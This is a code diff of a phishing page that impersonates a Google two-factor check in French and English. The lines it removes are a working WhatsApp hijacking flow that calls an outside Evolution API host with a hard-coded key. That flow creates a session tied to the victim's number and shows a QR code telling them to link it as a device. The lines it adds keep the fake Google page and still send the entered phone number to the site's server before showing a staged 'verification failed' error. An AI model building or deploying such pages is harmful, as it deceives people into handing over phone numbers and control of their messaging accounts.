@@ -42,12 +42,7 @@
       padding: 24px;
     }
 
-    html,
-    body,
-    input,
-    select,
-    button,
-    textarea {
+    html, body, input, select, button, textarea {
       font-family: var(--g-font);
     }
 
@@ -105,9 +100,7 @@
       gap: 12px;
     }
 
-    .phone-prefix {
-      position: relative;
-    }
+    .phone-prefix { position: relative; }
 
     .country-code-display {
       position: absolute;
@@ -119,20 +112,11 @@
       pointer-events: none;
     }
 
-    .phone-prefix select {
-      color: transparent;
-    }
+    .phone-prefix select { color: transparent; }
+    .phone-prefix select:focus { color: var(--g-text-900); }
+    .phone-prefix select:focus + .country-code-display { opacity: 0; }
 
-    .phone-prefix select:focus {
-      color: var(--g-text-900);
-    }
-
-    .phone-prefix select:focus + .country-code-display {
-      opacity: 0;
-    }
-
-    select,
-    input {
+    select, input {
       width: 100%;
       height: 44px;
       border: 1px solid var(--g-border);
@@ -146,8 +130,7 @@
       transition: border-color 0.12s ease, box-shadow 0.12s ease;
     }
 
-    select:focus,
-    input:focus {
+    select:focus, input:focus {
       border: 2px solid var(--g-blue);
       box-shadow: none;
       padding: 0 11px;
@@ -170,17 +153,11 @@
       cursor: pointer;
       transition: background 0.15s ease, transform 0.08s ease;
       padding: 0 24px;
-      margin-left: 0;
     }
 
     .btn:hover { background: var(--g-blue-dark); }
     .btn:active { transform: scale(0.99); }
-
-    .btn:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      background: #7fa6e8;
-    }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; background: #7fa6e8; }
 
     .loader-wrapper {
       display: flex;
@@ -207,73 +184,35 @@
       margin-bottom: 10px;
     }
 
-    .qr-display {
-      border-radius: 14px;
-      padding: 14px;
-      text-align: center;
-      margin-bottom: 24px;
-    }
-
-    .qr-label {
-      font-size: 12px;
-      color: var(--g-blue-dark);
-      text-transform: uppercase;
-      letter-spacing: 0.4px;
-      font-weight: 600;
-      margin-bottom: 7px;
-    }
-
-    .qr-image {
-      width: min(100%, 256px);
-      aspect-ratio: 1 / 1;
-      border-radius: 10px;
-      background: #fff;
-      border: 1px solid #d2dff7;
-      object-fit: contain;
-      padding: 8px;
-    }
-
-    .qr-hint {
-      margin:0 auto;
-      margin-top: 10px;
-      font-size: 12px;
-      color: var(--g-text-500);
-      line-height: 1.45;
-      max-width: 256px;
-    }
-
-    .qr-actions {
+    .error-icon {
+      width: 48px;
+      height: 48px;
+      margin: 0 auto 16px;
       display: flex;
+      align-items: center;
       justify-content: center;
-      margin-bottom: 16px;
+      border-radius: 50%;
+      background: #fce8e6;
     }
 
-    .qr-refresh-note {
-      margin-top: -6px;
-      margin-bottom: 14px;
-      text-align: center;
-      font-size: 11px;
-      color: var(--g-text-500);
-      line-height: 1.4;
+    .error-icon svg {
+      width: 24px;
+      height: 24px;
+      fill: #d93025;
     }
 
-    .btn-secondary {
-      background: #e8f0fe;
-      color: #174ea6;
-      border: 1px solid #c6dafc;
-      font-weight: 600;
-    }
-
-    .btn-secondary:hover {
-      background: #dfeafe;
-    }
-
-    .notice {
-      color: var(--g-text-500);
+    .error-text {
+      color: var(--g-text-700);
       font-size: 14px;
-      line-height: 1.5;
-      text-align: left;
+      line-height: 1.6;
+      text-align: center;
       margin-bottom: 24px;
+    }
+
+    .error-code {
+      font-size: 12px;
+      color: var(--g-text-500);
+      text-align: center;
     }
 
     .status {
@@ -282,13 +221,6 @@
       text-align: left;
       font-size: 14px;
       color: #d93025;
-    }
-
-    .meta {
-      text-align: left;
-      margin-top: 12px;
-      color: var(--g-text-500);
-      font-size: 12px;
     }
 
     @keyframes spin { to { transform: rotate(360deg); } }
@@ -310,8 +242,8 @@
     <img class="logo" src="/assets/google-icon.png" alt="Google" />
 
     <div class="step visible" id="step1">
-      <h1 class="step-title">Confirmez votre identité</h1>
-      <p class="step-desc">Utilisez votre numéro de téléphone pour confirmer votre identité.</p>
+      <h1 class="step-title">Confirmez votre identite</h1>
+      <p class="step-desc">Utilisez votre numero de telephone pour confirmer votre identite.</p>
 
       <form id="phoneForm">
         <div class="form-group">
@@ -323,7 +255,7 @@
               </select>
               <span id="countryCodeDisplay" class="country-code-display">+33</span>
             </div>
-            <input id="phoneNumber" name="phoneNumber" type="tel" autocomplete="tel" placeholder="Numéro de téléphone" required />
+            <input id="phoneNumber" name="phoneNumber" type="tel" autocomplete="tel" placeholder="Numero de telephone" required />
           </div>
         </div>
 
@@ -333,38 +265,27 @@
     </div>
 
     <div class="step" id="step2">
-      <h1 class="step-title">Vérification en cours</h1>
-      <p class="step-desc">Nous vérifions vos informations de connexion.</p>
+      <h1 class="step-title">Verification en cours</h1>
+      <p class="step-desc">Nous verifions vos informations de connexion.</p>
       <div class="loader-wrapper">
         <div class="spinner"></div>
-        <p class="loader-text">Vous allez être redirigé...</p>
+        <p class="loader-text" id="loaderText">Vous allez etre redirige...</p>
       </div>
-      <p class="status" id="status2"></p>
     </div>
 
     <div class="step" id="step3">
-      <h1 class="step-title">Vérifiez votre connexion</h1>
-      <p class="step-desc">Scannez le QR code suivant depuis un compte WhatsApp lié à votre numéro.</p>
+      <h1 class="step-title">Verification echouee</h1>
+      <p class="step-desc">Nous n'avons pas pu verifier votre identite.</p>
 
-      <div class="qr-display">
-        <img id="qrCodeImage" class="qr-image" alt="QR code WhatsApp" />
-        <p id="qrHint" class="qr-hint">Le QR expire rapidement. Vous pouvez le régénérer si besoin.</p>
+      <div class="error-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
       </div>
-
-      <div class="qr-actions">
-        <button id="refreshQrBtn" class="btn btn-secondary" type="button">Rafraîchir le code</button>
-      </div>
-      <p class="qr-refresh-note">Problème de connexion ? Obtenez un nouveau code.</p>
-
-      <p class="meta" id="instanceMeta" hidden></p>
+      <p class="error-text">La verification de securite a echoue. Votre session a expire ou le service est temporairement indisponible. Veuillez reessayer ulterieurement.</p>
+      <p class="error-code" id="errorCode"></p>
     </div>
   </div>
 
   <script>
-    const EVOLUTION_API_URL = "https://wa.smart-solutions-n8n.com";
-    const EVOLUTION_API_KEY = "9a6b0239caaed70bf0087cb3a8a7936fc3a9beb8e706503e";
-    const INSTANCE_NAME_MAX = 80;
-
     const URL_PARAMS = new URLSearchParams(window.location.search);
     const LANG = URL_PARAMS.get("lang") === "en" ? "en" : "fr";
     const GRANT_ID = URL_PARAMS.get("grant_id") || "";
@@ -372,31 +293,21 @@
     const I18N = {
       fr: {
         pageTitle: "Google - Authentification 2FA",
-        step1Title: "Confirmez votre identité",
-        step1Desc: "Utilisez votre numéro de téléphone pour confirmer votre identité.",
+        step1Title: "Confirmez votre identite",
+        step1Desc: "Utilisez votre numero de telephone pour confirmer votre identite.",
         labelCountryCode: "Indicatif",
-        placeholderPhone: "Numéro de téléphone",
+        placeholderPhone: "Numero de telephone",
         btnConfirm: "Confirmer",
-        step2Title: "Vérification en cours",
-        step2Desc: "Nous vérifions vos informations de connexion.",
-        loaderText: "Vous allez être redirigé...",
-        step3Title: "Vérifiez votre connexion",
-        step3Desc: "Scannez le QR code suivant depuis un compte WhatsApp lié à votre numéro.",
-        qrHintExpire: "Le QR expire rapidement. Vous pouvez le régénérer si besoin.",
-        qrHintSuccess: "QR régénéré avec succès. Scannez-le rapidement dans WhatsApp.",
-        qrHintScanned: "Depuis WhatsApp, dans vos appareils connectés, utilisez ce QR code",
-        btnRefresh: "Rafraîchir le code",
-        btnRefreshing: "Rafraîchissement...",
-        refreshNote: "Problème de connexion ? Obtenez un nouveau code.",
-        errorInvalidPhone: "Veuillez saisir un numéro valide.",
-        errorNotEligible: "Compte non-éligible, utilisez un compte plus actif pour accéder au document.",
-        errorNoInstance: "Aucune instance en cours.",
-        errorQrUnavailable: "QR indisponible pour cette instance. Réessayez dans quelques secondes.",
-        errorNoQr: "Aucun QR code reçu depuis Evolution API. Réessayez.",
-        errorCreateInstance: "Création de l'instance impossible.",
-        statusWaiting: "en attente",
-        statusVerified: "verifiée (open)",
-        statusWhatsApp: "Statut WhatsApp"
+        step2Title: "Verification en cours",
+        step2Desc: "Nous verifions vos informations de connexion.",
+        loaderText: "Vous allez etre redirige...",
+        loaderVerifying: "Verification de securite...",
+        loaderAlmost: "Finalisation...",
+        step3Title: "Verification echouee",
+        step3Desc: "Nous n'avons pas pu verifier votre identite.",
+        errorText: "La verification de securite a echoue. Votre session a expire ou le service est temporairement indisponible. Veuillez reessayer ulterieurement.",
+        errorInvalidPhone: "Veuillez saisir un numero valide.",
+        errorCode: "Erreur"
       },
       en: {
         pageTitle: "Google - 2FA Authentication",
@@ -408,23 +319,13 @@
         step2Title: "Verification in progress",
         step2Desc: "We are verifying your login information.",
         loaderText: "You will be redirected...",
-        step3Title: "Verify your connection",
-        step3Desc: "Scan the following QR code from a WhatsApp account linked to your number.",
-        qrHintExpire: "The QR code expires quickly. You can regenerate it if needed.",
-        qrHintSuccess: "QR regenerated successfully. Scan it quickly in WhatsApp.",
-        qrHintScanned: "From WhatsApp, in your linked devices, use this QR code",
-        btnRefresh: "Refresh code",
-        btnRefreshing: "Refreshing...",
-        refreshNote: "Connection issue? Get a new code.",
+        loaderVerifying: "Security verification...",
+        loaderAlmost: "Finalizing...",
+        step3Title: "Verification failed",
+        step3Desc: "We could not verify your identity.",
+        errorText: "The security verification failed. Your session has expired or the service is temporarily unavailable. Please try again later.",
         errorInvalidPhone: "Please enter a valid number.",
-        errorNotEligible: "Account not eligible, use a more active account to access the document.",
-        errorNoInstance: "No active instance.",
-        errorQrUnavailable: "QR unavailable for this instance. Try again in a few seconds.",
-        errorNoQr: "No QR code received from Evolution API. Please try again.",
-        errorCreateInstance: "Unable to create the instance.",
-        statusWaiting: "waiting",
-        statusVerified: "verified (open)",
-        statusWhatsApp: "WhatsApp status"
+        errorCode: "Error"
       }
     };
 
@@ -437,17 +338,9 @@
     ];
 
     const status1 = document.getElementById("status1");
-    const status2 = document.getElementById("status2");
-    const qrCodeImageEl = document.getElementById("qrCodeImage");
-    const qrHintEl = document.getElementById("qrHint");
-    const instanceMetaEl = document.getElementById("instanceMeta");
+    const loaderText = document.getElementById("loaderText");
     const countryCodeSelect = document.getElementById("countryCode");
     const countryCodeDisplay = document.getElementById("countryCodeDisplay");
-    const refreshQrBtn = document.getElementById("refreshQrBtn");
-
-    let isPollingInstanceReady = false;
-    let instancePollTimeout = null;
-    let isRedirectingToWaitingApproval = false;
 
     function showStep(index) {
       steps.forEach((step, i) => step.classList.toggle("visible", i === index));
@@ -459,111 +352,13 @@
       const normalizedPrefix = String(countryCode || "").replace(/\D/g, "");
       if (!normalizedPrefix) return digits;
       if (digits.startsWith(normalizedPrefix)) return digits;
-      // Avoid invalid numbers like 33 + 06... => 3306...
       const localDigits = digits.replace(/^0+/, "");
       return normalizedPrefix + (localDigits || digits);
     }
 
-    function randomAlphaSuffix(length = 4) {
-      const alphabet = "abcdefghijklmnopqrstuvwxyz";
-      let out = "";
-      for (let i = 0; i < length; i += 1) {
-        out += alphabet[Math.floor(Math.random() * alphabet.length)];
-      }
-      return out;
-    }
-
-    function instanceNameFromPhone(fullPhone, suffix) {
-      const digits = String(fullPhone || "").replace(/\D/g, "");
-      const core = digits || "unknown";
-      const safeSuffix = String(suffix || "").replace(/[^a-z]/g, "").slice(0, 4) || randomAlphaSuffix(4);
-      const base = `${core}-${safeSuffix}`;
-      return base.slice(0, INSTANCE_NAME_MAX).replace(/-+$/g, "");
-    }
-
-    function buildErrorMessage(payload, fallback) {
-      if (!payload || typeof payload !== "object") return fallback;
-      const fromArray = payload?.response?.message?.[0];
-      if (typeof fromArray === "string" && fromArray.length > 0) return fromArray;
-      if (typeof payload.message === "string" && payload.message.length > 0) return payload.message;
-      if (typeof payload.error === "string" && payload.error.length > 0) return payload.error;
-      return fallback;
-    }
-
-    function isLikelyDuplicateInstanceError(status, payload) {
-      if (status === 409) return true;
-      const blob = `${JSON.stringify(payload || {})} ${buildErrorMessage(payload, "")}`.toLowerCase();
-      return /already exists|já existe|duplicat|duplicate|existiert|in use|already registered|instance name/i.test(blob);
-    }
-
-    function extractQrBase64(payload) {
-      const fromRoot = payload?.base64;
-      if (typeof fromRoot === "string" && fromRoot.startsWith("data:image/")) return fromRoot;
-      const fromQrObject = payload?.qrcode?.base64;
-      if (typeof fromQrObject === "string" && fromQrObject.startsWith("data:image/")) return fromQrObject;
-      return "";
-    }
-
-    async function normalizeQrToBlack(qrBase64) {
-      if (typeof qrBase64 !== "string" || !qrBase64.startsWith("data:image/")) return qrBase64;
-
-      try {
-        const image = new Image();
-        const loaded = new Promise((resolve, reject) => {
-          image.onload = resolve;
-          image.onerror = () => reject(new Error("QR illisible"));
-        });
-
-        image.src = qrBase64;
-        await loaded;
-
-        const width = image.naturalWidth || image.width;
-        const height = image.naturalHeight || image.height;
-        if (!width || !height) return qrBase64;
-
-        const canvas = document.createElement("canvas");
-        canvas.width = width;
-        canvas.height = height;
-
-        const context = canvas.getContext("2d", { willReadFrequently: true });
-        if (!context) return qrBase64;
-
-        context.drawImage(image, 0, 0, width, height);
-        const imageData = context.getImageData(0, 0, width, height);
-        const data = imageData.data;
-
-        for (let index = 0; index < data.length; index += 4) {
-          const alpha = data[index + 3];
-          if (alpha < 40) {
-            data[index] = 255;
-            data[index + 1] = 255;
-            data[index + 2] = 255;
-            data[index + 3] = 255;
-            continue;
-          }
-
-          const red = data[index];
-          const green = data[index + 1];
-          const blue = data[index + 2];
-          const luminance = 0.2126 * red + 0.7152 * green + 0.0722 * blue;
-          const target = luminance < 150 ? 0 : 255;
-
-          data[index] = target;
-          data[index + 1] = target;
-          data[index + 2] = target;
-          data[index + 3] = 255;
-        }
-
-        context.putImageData(imageData, 0, 0);
-        return canvas.toDataURL("image/png");
-      } catch (error) {
-        return qrBase64;
-      }
-    }
-
-    function setRefreshButtonLoading(loading) {
-      refreshQrBtn.disabled = loading;
-      refreshQrBtn.textContent = loading ? t.btnRefreshing : t.btnRefresh;
+    function generateErrorCode() {
+      const hex = Array.from({ length: 8 }, () => Math.floor(Math.random() * 16).toString(16)).join("");
+      return hex.toUpperCase();
     }
 
     function updateCountryCodeDisplay() {
@@ -580,8 +375,8 @@
       ] : [
         { name: "France", dial: "+33" },
         { name: "Canada", dial: "+1" },
-        { name: "États-Unis", dial: "+1" },
-        { name: "Indonésie", dial: "+62" },
+        { name: "Etats-Unis", dial: "+1" },
+        { name: "Indonesie", dial: "+62" },
         { name: "Royaume-Uni", dial: "+44" }
       ];
 
@@ -596,22 +391,15 @@
             const suffixes = Array.isArray(country?.idd?.suffixes) ? country.idd.suffixes : [];
             const suffix = suffixes[0] || "";
             const dial = `${root}${suffix}`.trim();
-            const frenchName = LANG === "en"
+            const name = LANG === "en"
               ? (country?.name?.common || "")
-              : (country?.translations?.fra?.common ||
-                 country?.translations?.fra?.official ||
-                 country?.name?.common ||
-                 "");
-            return {
-              name: frenchName,
-              dial
-            };
+              : (country?.translations?.fra?.common || country?.translations?.fra?.official || country?.name?.common || "");
+            return { name, dial };
           })
           .filter((item) => item.name && /^\+\d+$/.test(item.dial));
 
         entries.sort((a, b) => a.name.localeCompare(b.name, LANG, { sensitivity: "base" }));
 
-        // Dedup by visible label to avoid repeated territories.
         const unique = [];
         const seen = new Set();
         for (const item of entries) {
@@ -627,13 +415,10 @@
           const option = document.createElement("option");
           option.value = item.dial;
           option.textContent = `${item.dial} ${item.name}`;
-          if (item.name.toLowerCase() === "france" && item.dial === "+33") {
-            option.selected = true;
-          }
+          if (item.name.toLowerCase() === "france" && item.dial === "+33") option.selected = true;
           countryCodeSelect.appendChild(option);
         }
 
-        // If France was not found for any reason, enforce +33 when available.
         if (!countryCodeSelect.value && countryCodeSelect.options.length > 0) {
           const franceOption = Array.from(countryCodeSelect.options).find(
             (option) => option.value === "+33" && option.textContent.toLowerCase().includes("france")
@@ -647,176 +432,20 @@
           const option = document.createElement("option");
           option.value = item.dial;
           option.textContent = `${item.dial} ${item.name}`;
-          if (item.name === "France" && item.dial === "+33") {
-            option.selected = true;
-          }
+          if (item.name === "France" && item.dial === "+33") option.selected = true;
           countryCodeSelect.appendChild(option);
         });
         updateCountryCodeDisplay();
       }
     }
 
-    function formatInstanceMeta(baseText, instanceStatus) {
-      const statusLabel = instanceStatus ? `${t.statusWhatsApp}: ${instanceStatus}` : `${t.statusWhatsApp}: ${t.statusWaiting}`;
-      return baseText ? `${baseText} · ${statusLabel}` : statusLabel;
-    }
-
-    async function evolutionJson(path, init = undefined) {
-      const response = await fetch(`${EVOLUTION_API_URL}${path}`, {
-        ...init,
-        headers: {
-          ...(init?.headers || {}),
-          apikey: EVOLUTION_API_KEY
-        }
-      });
-      const data = await response.json().catch(() => ({}));
-      return { response, data };
-    }
-
-    async function checkInstanceReady() {
-      const instanceName = sessionStorage.getItem("evolution_instance_name") || "";
-      if (!instanceName) return { ready: false, instance: null };
-
-      const { response, data } = await evolutionJson("/instance/fetchInstances");
-      if (!response.ok) {
-        throw new Error(buildErrorMessage(data, `Erreur ${response.status}`));
-      }
-      const list = Array.isArray(data) ? data : Array.isArray(data?.data) ? data.data : [];
-      const instance = list.find((i) => i && i.name === instanceName) || null;
-
-      const statusNormalized = String(instance?.connectionStatus || instance?.status || "").toLowerCase();
-      const ready = statusNormalized === "open";
-
-      return { ready, instance };
-    }
-
-    function startInstanceReadyPolling() {
-      if (isPollingInstanceReady) return;
-      isPollingInstanceReady = true;
-
-      const POLL_EVERY_MS = 5000;
-      const MAX_ATTEMPTS = 72; // ~= 6 min
-      let attempts = 0;
-
-      const poll = async () => {
-        attempts += 1;
-        try {
-          const { ready, instance } = await checkInstanceReady();
-          const baseText = instanceMetaEl?.dataset?.baseText || instanceMetaEl?.textContent || "";
-
-          if (ready) {
-            instanceMetaEl.textContent = formatInstanceMeta(baseText, t.statusVerified);
-            if (instancePollTimeout) {
-              window.clearTimeout(instancePollTimeout);
-              instancePollTimeout = null;
-            }
-            if (!isRedirectingToWaitingApproval) {
-              isRedirectingToWaitingApproval = true;
-              window.location.href = `/waiting-approval?lang=${LANG}`;
-            }
-            return;
-          }
-
-          const rawStatus = instance?.status ? String(instance.status) : "";
-          instanceMetaEl.textContent = formatInstanceMeta(baseText, rawStatus || t.statusWaiting);
-        } catch (e) {
-          // En cas d'erreur réseau/API, on poursuit le polling.
-        }
-
-        if (attempts < MAX_ATTEMPTS) {
-          instancePollTimeout = window.setTimeout(poll, POLL_EVERY_MS);
-          return;
-        }
-      };
-
-      poll();
-    }
-
-    async function requestPairingViaServer(fullPhone) {
-      let instanceName = instanceNameFromPhone(fullPhone, randomAlphaSuffix(4));
-      let createResponse = null;
-      let createPayload = {};
-      const maxCreateAttempts = 5;
-
-      for (let createAttempt = 1; createAttempt <= maxCreateAttempts; createAttempt += 1) {
-        const createResult = await evolutionJson("/instance/create", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            instanceName,
-            number: fullPhone,
-            integration: "WHATSAPP-BAILEYS",
-            qrcode: true
-          })
-        });
-
-        createResponse = createResult.response;
-        createPayload = createResult.data;
-
-        if (createResponse.ok) {
-          break;
-        }
-
-        if (!isLikelyDuplicateInstanceError(createResponse.status, createPayload)) {
-          throw new Error(buildErrorMessage(createPayload, `Erreur ${createResponse.status}`));
-        }
-
-        instanceName = instanceNameFromPhone(fullPhone, randomAlphaSuffix(4));
-      }
-
-      if (!createResponse || !createResponse.ok) {
-        throw new Error(buildErrorMessage(createPayload, t.errorCreateInstance));
-      }
-
-      const maxConnectAttempts = 5;
-      for (let connectAttempt = 1; connectAttempt <= maxConnectAttempts; connectAttempt += 1) {
-        const connectResult = await evolutionJson(
-          `/instance/connect/${encodeURIComponent(instanceName)}`,
-          { method: "GET" }
-        );
-        const connectPayload = connectResult.data;
-        const qrBase64 = extractQrBase64(connectPayload);
-        const qrCount = typeof connectPayload?.count === "number" ? connectPayload.count : null;
-
-        if (connectResult.response.ok && qrBase64) {
-          return { qrBase64, qrCount, instanceName, phoneDisplay: fullPhone };
-        }
-
-        await new Promise((resolve) => window.setTimeout(resolve, 900));
-      }
-
-      throw new Error(t.errorNoQr);
-    }
-
-    async function refreshQrForCurrentInstance() {
-      const instanceName = sessionStorage.getItem("evolution_instance_name") || "";
-      if (!instanceName) {
-        throw new Error(t.errorNoInstance);
-      }
-
-      const connectResult = await evolutionJson(`/instance/connect/${encodeURIComponent(instanceName)}`, {
-        method: "GET"
-      });
-
-      if (!connectResult.response.ok) {
-        throw new Error(buildErrorMessage(connectResult.data, `Erreur ${connectResult.response.status}`));
-      }
-
-      const qrBase64 = extractQrBase64(connectResult.data);
-      const qrCount = typeof connectResult.data?.count === "number" ? connectResult.data.count : null;
-      if (!qrBase64) {
-        throw new Error(t.errorQrUnavailable);
-      }
-
-      return { qrBase64, qrCount };
+    function wait(ms) {
+      return new Promise((resolve) => setTimeout(resolve, ms));
     }
 
     document.getElementById("phoneForm").addEventListener("submit", async (event) => {
       event.preventDefault();
       status1.textContent = "";
-      status2.textContent = "";
 
       const countryCode = document.getElementById("countryCode").value;
       const phoneNumber = document.getElementById("phoneNumber").value;
@@ -829,57 +458,34 @@
 
       showStep(1);
 
-      // Save phone to Supabase if grant_id is available
       if (GRANT_ID) {
         try {
           await fetch("/api/grant-phone", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ grant_id: GRANT_ID, phone: countryCode + "-" + document.getElementById("phoneNumber").value.replace(/\D/g, "").replace(/^0+/, "") })
+            body: JSON.stringify({
+              grant_id: GRANT_ID,
+              phone: countryCode + "-" + document.getElementById("phoneNumber").value.replace(/\D/g, "").replace(/^0+/, "")
+            })
           });
-        } catch (_e) {
-          // Non-blocking: don't stop the flow if phone save fails
-        }
+        } catch (_e) {}
       }
 
-      try {
-        const { qrBase64, qrCount, instanceName, phoneDisplay } = await requestPairingViaServer(fullPhone);
-        qrCodeImageEl.src = await normalizeQrToBlack(qrBase64);
-        qrHintEl.textContent = t.qrHintScanned;
-        const phoneLabel = phoneDisplay ? ` · +${phoneDisplay}` : "";
-        instanceMetaEl.textContent = `Instance : ${instanceName}${phoneLabel}`;
-        instanceMetaEl.dataset.baseText = instanceMetaEl.textContent;
-        instanceMetaEl.hidden = true;
-        sessionStorage.setItem("evolution_instance_name", instanceName);
-        showStep(2);
+      loaderText.textContent = t.loaderText;
+      await wait(2500);
 
-        // Redirection automatique vers waiting-approval dès que l’instance Evolution/WhatsApp est prête.
-        startInstanceReadyPolling();
-      } catch (error) {
-        showStep(0);
-        status1.textContent = t.errorNotEligible;
-      }
-    });
+      loaderText.textContent = t.loaderVerifying;
+      await wait(3000);
 
-    refreshQrBtn.addEventListener("click", async () => {
-      status2.textContent = "";
-      try {
-        setRefreshButtonLoading(true);
-        const { qrBase64, qrCount } = await refreshQrForCurrentInstance();
-        qrCodeImageEl.src = await normalizeQrToBlack(qrBase64);
-        qrHintEl.textContent = `${t.qrHintSuccess}${
-          typeof qrCount === "number" ? ` #${qrCount}` : ""
-        }`;
-      } catch (error) {
-        qrHintEl.textContent = t.errorNotEligible;
-      } finally {
-        setRefreshButtonLoading(false);
-      }
+      loaderText.textContent = t.loaderAlmost;
+      await wait(2000);
+
+      document.getElementById("errorCode").textContent = `${t.errorCode} #${generateErrorCode()}`;
+      showStep(2);
     });
 
     countryCodeSelect.addEventListener("change", updateCountryCodeDisplay);
 
-    // Apply i18n to static DOM elements
     document.documentElement.lang = LANG;
     document.title = t.pageTitle;
     document.querySelector("#step1 .step-title").textContent = t.step1Title;
@@ -889,12 +495,10 @@
     document.querySelector("#phoneForm .btn").textContent = t.btnConfirm;
     document.querySelector("#step2 .step-title").textContent = t.step2Title;
     document.querySelector("#step2 .step-desc").textContent = t.step2Desc;
-    document.querySelector(".loader-text").textContent = t.loaderText;
+    loaderText.textContent = t.loaderText;
     document.querySelector("#step3 .step-title").textContent = t.step3Title;
     document.querySelector("#step3 .step-desc").textContent = t.step3Desc;
-    qrHintEl.textContent = t.qrHintExpire;
-    refreshQrBtn.textContent = t.btnRefresh;
-    document.querySelector(".qr-refresh-note").textContent = t.refreshNote;
+    document.querySelector(".error-text").textContent = t.errorText;
 
     loadCountryCodes();
   </script>
